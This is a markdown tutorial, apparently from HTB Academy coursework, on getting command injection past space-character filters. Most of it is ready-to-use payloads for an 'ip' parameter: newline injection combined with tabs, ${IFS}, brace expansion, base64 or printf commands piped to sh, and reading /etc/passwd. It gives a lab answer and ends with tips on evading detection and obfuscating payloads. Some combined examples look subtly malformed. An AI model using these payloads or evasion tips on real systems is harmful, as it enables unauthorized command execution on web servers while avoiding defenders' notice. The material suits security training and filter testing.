# Bypassing Space Filters

> **🚫➡️✅ Space Evasion:** Comprehensive techniques for bypassing space character filters in command injection attacks

## Overview

Space characters are commonly blacklisted in input validation filters, especially when the expected input shouldn't contain spaces (like IP addresses). However, there are numerous methods to achieve command separation and argument passing without using actual space characters.

This section demonstrates multiple space bypass techniques using Linux as the primary example, with Windows compatibility notes where applicable.

**Focus:** Practical space filter evasion methods with hands-on exploitation examples.

---

## Bypass Blacklisted Operators

### Confirming Newline Works

From our filter identification phase, we discovered that the newline character (`\n` / `%0a`) is not blacklisted while other operators are blocked.

**Verification Test:**
```http
# Test newline operator
ip=127.0.0.1%0a

# Expected result: Normal ping output (✅ Not blocked)
# Confirms newline can be used as injection operator
```

**Response Analysis:**
```html
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

**Key Finding:** Newline character works as injection operator on both Linux and Windows platforms.

---

## Space Filter Detection

### Testing Space Character

**Attempted Payload:**
```http
ip=127.0.0.1%0a whoami
# URL encoded: ip=127.0.0.1%0a%20whoami
```

**Response:**
```html
Invalid input
```

**Isolated Space Test:**
```http
ip=127.0.0.1%0a%20
# Testing just the space character
```

**Result:** `Invalid input` - Confirms space character (`%20`) is blacklisted.

### Understanding Space Filter Logic

**Common PHP Implementation:**
```php
$blacklist = [';', '&', '|', ' ', '\t', 'sh', 'bash', ...];

foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
        exit();
    }
}
```

**Why Spaces Are Filtered:**
- **Input validation** - Expected inputs (IP addresses) shouldn't contain spaces
- **Command prevention** - Spaces enable argument separation in commands
- **Security measure** - Reduces attack surface for command injection

---

## Space Bypass Techniques

### Method 1: Tab Characters

**Technique:** Replace spaces with tab characters (`\t` / `%09`)

**Why It Works:**
- Both Linux and Windows accept tabs between command arguments
- Commands execute identically with tabs as with spaces
- Tab character often not included in blacklists

**Implementation:**
```http
# Original (blocked): 127.0.0.1%0a%20whoami
# Tab bypass: 127.0.0.1%0a%09whoami
ip=127.0.0.1%0a%09whoami
```

**Expected Response:**
```html
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
www-data
```

**Verification:** ✅ Successfully bypassed space filter using tab character.

### Method 2: Environment Variables ($IFS)

**Technique:** Use Linux Internal Field Separator environment variable

**Understanding $IFS:**
- **Default value** contains space and tab characters
- **Automatic expansion** replaces `${IFS}` with its value
- **Universal availability** on Unix/Linux systems

**Local Testing:**
```bash
# Verify IFS contains space and tab
kabaneridev@htb[/htb]$ echo "$IFS" | cat -A
 ^I$

# Test command with IFS
kabaneridev@htb[/htb]$ ls${IFS}-la
total 8
drwxr-xr-x 2 kabaneridev kabaneridev 4096 Jul 13 10:30 .
drwxr-xr-x 3 kabaneridev kabaneridev 4096 Jul 13 10:30 ..
```

**Web Application Implementation:**
```http
ip=127.0.0.1%0a${IFS}whoami
# URL encoded: ip=127.0.0.1%0a%24%7bIFS%7dwhoami
```

**Expected Response:**
```html
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
www-data
```

**Verification:** ✅ Successfully bypassed space filter using `${IFS}`.

### Method 3: Bash Brace Expansion

**Technique:** Use Bash brace expansion feature for automatic spacing

**Understanding Brace Expansion:**
- **Automatic separation** - Bash adds spaces between comma-separated values
- **No explicit spaces** - Command contains no space characters
- **Argument processing** - Each element becomes separate argument

**Local Testing:**
```bash
# Traditional command with spaces
kabaneridev@htb[/htb]$ ls -la

# Brace expansion equivalent (no spaces)
kabaneridev@htb[/htb]$ {ls,-la}
total 0
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 07:37 .
drwxr-xr-x 1 21y4d 21y4d   0 Jul 13 13:01 ..
```

**Web Application Implementation:**
```http
ip=127.0.0.1%0a{whoami}
# For commands with arguments:
ip=127.0.0.1%0a{ls,-la}
```

**Multi-Argument Example:**
```http
# Traditional: ls -la /etc/passwd
# Brace expansion: {ls,-la,/etc/passwd}
ip=127.0.0.1%0a{ls,-la,/etc/passwd}
```

---

## Additional Space Bypass Methods

### Method 4: Redirection Operators

**Technique:** Use input/output redirection for spacing

```bash
# Using input redirection
cat</etc/passwd

# Using output redirection  
ls>output.txt
cat<output.txt

# Web application usage
ip=127.0.0.1%0acat</etc/passwd
```

### Method 5: Variable Assignment

**Technique:** Assign commands to variables without spaces

```bash
# Variable assignment without spaces
cmd=whoami;$cmd

# With arguments
cmd="ls -la";$cmd

# Web application usage
ip=127.0.0.1%0acmd=whoami;$cmd
```

### Method 6: Base64 Encoding

**Technique:** Encode entire command to avoid problematic characters

```bash
# Encode command
echo "ls -la" | base64
# Result: bHMgLWxhCg==

# Execute encoded command
echo bHMgLWxhCg== | base64 -d | sh

# Web application usage
ip=127.0.0.1%0aecho${IFS}bHMgLWxhCg==|base64${IFS}-d|sh
```

### Method 7: Hex Encoding

**Technique:** Use hex encoding with printf

```bash
# Create space using printf
printf "\x20"

# Execute command with hex-encoded space
printf "ls\x20-la" | sh

# Web application usage
ip=127.0.0.1%0aprintf${IFS}"ls\x20-la"|sh
```

### Method 8: Alternative Separators

**Extended Whitespace Characters:**
```bash
\t    → %09    → Tab
\n    → %0a    → Newline  
\r    → %0d    → Carriage return
\v    → %0b    → Vertical tab
\f    → %0c    → Form feed
```

**Testing Extended Characters:**
```http
# Vertical tab
ip=127.0.0.1%0awhoami%0bls

# Form feed  
ip=127.0.0.1%0awhoami%0cls

# Combined separators
ip=127.0.0.1%0awhoami%09%0als
```

---

## HTB Academy Lab Solution

### Challenge Requirements

**Task:** Execute the command `ls -la` and find the size of `index.php` file.

**Known Constraints:**
- Newline (`\n`/`%0a`) injection operator works
- Space characters are blacklisted
- Need to bypass space in `ls -la`

### Solution Approaches

**Method 1: Tab Character Bypass**
```http
ip=127.0.0.1%0als%09-la
```

**Method 2: IFS Variable Bypass**
```http
ip=127.0.0.1%0als${IFS}-la
# URL encoded: ip=127.0.0.1%0als%24%7bIFS%7d-la
```

**Method 3: Brace Expansion Bypass**
```http
ip=127.0.0.1%0a{ls,-la}
```

### Expected Output Analysis

**Command Output:**
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.074 ms
--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms

total 20
drwxr-xr-x 2 www-data www-data 4096 Jul 13 10:30 .
drwxr-xr-x 3 www-data www-data 4096 Jul 13 10:30 ..
-rw-r--r-- 1 www-data www-data 1613 Jul 13 10:30 index.php
-rw-r--r-- 1 www-data www-data  842 Jul 13 10:30 style.css
```

**File Size Identification:**
- **index.php**: 1613 bytes
- **style.css**: 842 bytes

**Answer:** `1613`

---

## Advanced Bypass Combinations

### Multi-Method Combinations

**Combining Techniques:**
```bash
# IFS + Brace expansion
{echo,${IFS},"Hello World"}

# Tab + Variable assignment
cmd=ls%09-la;$cmd

# Base64 + IFS
echo${IFS}bHMgLWxhCg==|base64${IFS}-d|sh
```

### Platform-Specific Methods

**Linux-Specific:**
```bash
# Process substitution
cat<(ls -la)

# Command substitution with IFS
$(echo${IFS}ls${IFS}-la)

# Here-string
cat<<<"ls -la"
```

**Windows CMD:**
```cmd
# Caret escape character
ls^-la

# Variable expansion
set cmd=ls -la && %cmd%
```

**Windows PowerShell:**
```powershell
# Tick escape
ls`-la

# String expansion
"ls -la" | Invoke-Expression
```

---

## Systematic Testing Methodology

### Step-by-Step Approach

**Phase 1: Confirm Working Injection**
```http
# Verify injection operator works
ip=127.0.0.1%0a
# Result: ✅ Normal ping output
```

**Phase 2: Test Space Alternatives**
```http
# Test each bypass method
ip=127.0.0.1%0awhoami%09    # Tab
ip=127.0.0.1%0awhoami${IFS} # IFS
ip=127.0.0.1%0a{whoami}     # Brace expansion
```

**Phase 3: Execute Target Command**
```http
# Apply working bypass to target command
ip=127.0.0.1%0a{ls,-la}
```

**Phase 4: Parse Results**
```bash
# Extract required information from output
# Look for specific files and their sizes
```

### Payload Development Template

**Progressive Complexity:**
```bash
# Level 1: Basic injection
127.0.0.1%0acommand

# Level 2: Single argument
127.0.0.1%0acommand%09arg

# Level 3: Multiple arguments  
127.0.0.1%0a{command,arg1,arg2}

# Level 4: Complex operations
127.0.0.1%0aecho${IFS}payload|base64${IFS}-d|sh
```

---

## Comprehensive Reference Table

### Space Bypass Methods Comparison

| **Method** | **Syntax** | **URL Encoded** | **Platform** | **Reliability** |
|------------|------------|-----------------|--------------|-----------------|
| **Tab** | `\t` | `%09` | Universal | High |
| **IFS Variable** | `${IFS}` | `%24%7bIFS%7d` | Unix/Linux | High |
| **Brace Expansion** | `{cmd,arg}` | `%7bcmd,arg%7d` | Bash | Medium |
| **Vertical Tab** | `\v` | `%0b` | Universal | Medium |
| **Form Feed** | `\f` | `%0c` | Universal | Low |
| **Base64** | `echo X\|base64 -d\|sh` | Complex | Unix/Linux | Medium |
| **Hex Encoding** | `printf "cmd\x20arg"` | Complex | Unix/Linux | Medium |
| **Redirection** | `cat<file` | `cat%3cfile` | Unix/Linux | High |

### Selection Strategy

**Primary Methods (High Success Rate):**
1. **Tab character** (`%09`) - Universal compatibility
2. **IFS variable** (`${IFS}`) - Reliable on Unix/Linux
3. **Brace expansion** (`{cmd,arg}`) - Clean syntax

**Fallback Methods:**
1. **Extended whitespace** (`%0b`, `%0c`) - When primary blocked
2. **Encoding methods** - When characters are heavily filtered
3. **Platform-specific** - When environment is known

---

## Detection Evasion Tips

### Stealth Considerations

**Avoid Common Patterns:**
- Don't always use the same bypass method
- Vary payload structure between requests
- Mix different techniques in single payload

**Blend with Normal Traffic:**
- Use realistic command arguments
- Avoid obviously malicious commands
- Time requests to appear natural

**Error Handling:**
```bash
# Graceful degradation
{ls,-la}||{dir,/w}||echo${IFS}"fallback"
```

### Payload Obfuscation

**Multi-Layer Encoding:**
```bash
# Double encoding
echo cHdkCg== | base64 -d | sh

# Mixed methods
{echo,${IFS},cHdkCg==}|base64${IFS}-d|sh
```

This comprehensive guide to space filter bypasses provides multiple reliable methods for maintaining command injection capabilities even when space characters are blacklisted, ensuring successful exploitation across various filtering scenarios. 